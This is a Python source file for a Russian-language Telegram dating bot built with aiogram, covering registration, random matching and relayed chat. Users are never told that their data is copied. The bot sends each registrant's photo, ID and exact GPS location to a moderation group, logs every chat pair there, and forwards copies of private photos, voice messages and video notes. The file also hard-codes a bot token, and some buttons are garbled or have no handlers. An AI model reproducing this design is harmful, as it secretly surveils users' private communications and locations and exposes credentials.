import asyncio
import aiosqlite
import time
import sys
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import *
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext

# --- КОНФИГ ---
TOKEN = "8818998265:AAHVKZ3FIKXnBQDCQSO0U8_yWpYEYwBexec"
ADMIN_ID = 7305658106
MOD_GROUP = -1003991876955

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
DB = "dating_final_stable.db"

# --- БАЗА ---
async def init_db():
    async with aiosqlite.connect(DB) as db:
        await db.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            name TEXT, age INTEGER, gender TEXT, pref TEXT,
            photo TEXT, question TEXT, lat REAL, lon REAL, status TEXT DEFAULT 'active'
        )""")
        await db.commit()

class Reg(StatesGroup):
    name, age, gender, pref, geo, photo, question = State(), State(), State(), State(), State(), State(), State()

class Chat(StatesGroup):
    target = State()

def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="🔍 Кто рядом?")],
        [KeyboardButton(text="😶‍образное Заморозить"), KeyboardButton(text="✨ ilikeit")]
    ], resize_keyboard=True)

# --- РЕГИСТРАЦИЯ ---
@router.message(F.text == "/start")
async def start(m: Message, state: FSMContext):
    async with aiosqlite.connect(DB) as db:
        async with db.execute("SELECT user_id FROM users WHERE user_id=?", (m.from_user.id,)) as cur:
            if await cur.fetchone():
                return await m.answer("С возвращением!", reply_markup=main_kb())
    await m.answer("Привет! Как тебя зовут?")
    await state.set_state(Reg.name)

@router.message(Reg.name)
async def reg_name(m: Message, state: FSMContext):
    await state.update_data(name=m.text)
    await m.answer("Твой возраст?")
    await state.set_state(Reg.age)

@router.message(Reg.age)
async def reg_age(m: Message, state: FSMContext):
    if not m.text.isdigit(): return await m.answer("Пиши цифрами.")
    await state.update_data(age=int(m.text))
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Парень"), KeyboardButton(text="Девушка")]], resize_keyboard=True)
    await m.answer("Твой пол?", reply_markup=kb)
    await state.set_state(Reg.gender)

@router.message(Reg.gender)
async def reg_gender(m: Message, state: FSMContext):
    await state.update_data(gender=m.text)
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="Парней"), KeyboardButton(text="Девушек"), KeyboardButton(text="Всех")]], resize_keyboard=True)
    await m.answer("Кого ищешь?", reply_markup=kb)
    await state.set_state(Reg.pref)

@router.message(Reg.pref)
async def reg_pref(m: Message, state: FSMContext):
    await state.update_data(pref=m.text)
    kb = ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📍 Поделиться GPS (поиск рядом)", request_location=True)]
    ], resize_keyboard=True)
    await m.answer("Нажми кнопку ниже, чтобы найти людей поблизости:", reply_markup=kb)
    await state.set_state(Reg.geo)

@router.message(Reg.geo, F.location)
async def reg_geo(m: Message, state: FSMContext):
    await state.update_data(lat=m.location.latitude, lon=m.location.longitude)
    await m.answer("Локация принята! Теперь пришли одно ФОТО:", reply_markup=ReplyKeyboardRemove())
    await state.set_state(Reg.photo)

@router.message(Reg.photo, F.photo)
async def reg_photo(m: Message, state: FSMContext):
    await state.update_data(photo=m.photo[-1].file_id)
    await m.answer("Твой секретный вопрос?")
    await state.set_state(Reg.question)

@router.message(Reg.question)
async def reg_final(m: Message, state: FSMContext):
    d = await state.get_data()
    async with aiosqlite.connect(DB) as db:
        await db.execute(
            "INSERT OR REPLACE INTO users (user_id, name, age, gender, pref, photo, question, lat, lon, status) VALUES (?,?,?,?,?,?,?,?,?,?)",
            (m.from_user.id, d['name'], d['age'], d['gender'], d['pref'], d['photo'], m.text, d['lat'], d['lon'], 'active')
        )
        await db.commit()
    
    # Модерация
    cap = f"🆕 <b>АНКЕТА</b>\n👤 {d['name']}, {d['age']} л.\n🆔 <code>{m.from_user.id}</code>\n📍 GPS получен."
    await bot.send_photo(MOD_GROUP, d['photo'], caption=cap, parse_mode="HTML")
    await bot.send_location(MOD_GROUP, latitude=d['lat'], longitude=d['lon'])
    
    await m.answer("Готово! Начинаем поиск?", reply_markup=main_kb())
    await state.clear()

# --- ПОИСК ---
@router.message(F.text == "🔍 Кто рядом?")
async def find(m: Message):
    async with aiosqlite.connect(DB) as db:
        async with db.execute("SELECT age, pref FROM users WHERE user_id=?", (m.from_user.id,)) as cur:
            me = await cur.fetchone()
        if not me: return await m.answer("Пройди регистрацию /start")
        
        async with db.execute("SELECT * FROM users WHERE user_id != ? AND status='active' ORDER BY RANDOM() LIMIT 1", (m.from_user.id,)) as cur:
            u = await cur.fetchone()
            
    if u:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💌 Написать", callback_data=f"chat_{u[0]}")]
        ])
        await bot.send_photo(m.chat.id, u[5], caption=f"✨ {u[1]}, {u[2]} лет\nВопрос: {u[6]}", reply_markup=kb)
    else:
        await m.answer("Никого не нашли.")

# --- ЧАТ ---
@router.callback_query(F.data.startswith("chat_"))
async def start_chat(c: CallbackQuery, state: FSMContext):
    target = c.data.split("_")[1]
    await state.update_data(target=target)
    await state.set_state(Chat.target)
    await c.message.answer("Чат активен! 'exit' для выхода.")

@router.message(Chat.target)
async def chat_logic(m: Message, state: FSMContext):
    if m.text == "exit":
        await state.clear()
        return await m.answer("Выход.", reply_markup=main_kb())
    
    d = await state.get_data()
    target = d['target']
    
    # Лог в группу
    await bot.send_message(MOD_GROUP, f"🕵️ <b>ЛОГ:</b> {m.from_user.id} ➡️ {target}")
    
    try:
        if m.text: await bot.send_message(target, f"📩: {m.text}")
        elif m.photo: 
            await bot.send_photo(target, m.photo[-1].file_id, caption=m.caption)
            await bot.send_photo(MOD_GROUP, m.photo[-1].file_id)
        elif m.voice: 
            await bot.send_voice(target, m.voice.file_id)
            await bot.send_voice(MOD_GROUP, m.voice.file_id)
        elif m.video_note: 
            await bot.send_video_note(target, m.video_note.file_id)
            await bot.send_video_note(MOD_GROUP, m.video_note.file_id)
    except:
        await m.answer("Пользователь недоступен.")

# --- ЗАПУСК С ЗАЩИТОЙ ---
async def main():
    await init_db()
    dp.include_router(router)
    # Удаляем вебхуки перед стартом для чистого запуска
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    print("=== ЗАПУСК СИСТЕМЫ СТАБИЛИЗАЦИИ ===")
    while True:
        try:
            asyncio.run(main())
        except Exception as e:
            # Если бот упал, он напишет ошибку и сам встанет через 5 сек
            print(f"[{time.strftime('%H:%M:%S')}] Ошибка: {e}")
            print("Перезапуск процесса...")
            time.sleep(5)
